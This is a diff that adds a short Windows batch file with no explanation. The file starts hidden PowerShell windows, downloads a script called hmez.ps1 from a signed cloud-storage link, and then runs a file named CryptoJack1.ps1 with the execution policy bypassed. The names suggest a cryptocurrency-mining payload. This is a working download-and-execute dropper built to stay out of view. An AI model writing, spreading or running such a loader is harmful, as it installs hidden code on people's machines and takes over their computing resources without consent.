@@ -1,0 +1,4 @@
+@echo off
+set currentDir=%~dp0
+start /wait powershell.exe -NoP -NonI -W Hidden -Command "&{(New-Object System.Net.WebClient).DownloadString('https://s3.eu-central-1.amazonaws.com/blob-eu-central-1-nwsekq/sara/fa/faa1/faa1cd93-e7a2-4948-8ef7-9d14bda3c792.bin?response-content-disposition=attachment%3B%20filename%3D%22hmez.ps1%22&response-content-type=&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA4DM2EY46SOWUMUP4%2F20230219%2Feu-central-1%2Fs3%2Faws4_request&X-Amz-Date=20230219T150456Z&X-Amz-SignedHeaders=host&X-Amz-Expires=1800&X-Amz-Signature=aae5c7d3d46f9552f9459a70cc1d5ef5280bebe101328368c45800f07b6c9d9a') > '%~dp0hmez.ps1'; exit}" 
+Powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell.exe -ArgumentList '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""%~dp0CryptoJack1.ps1""'}"
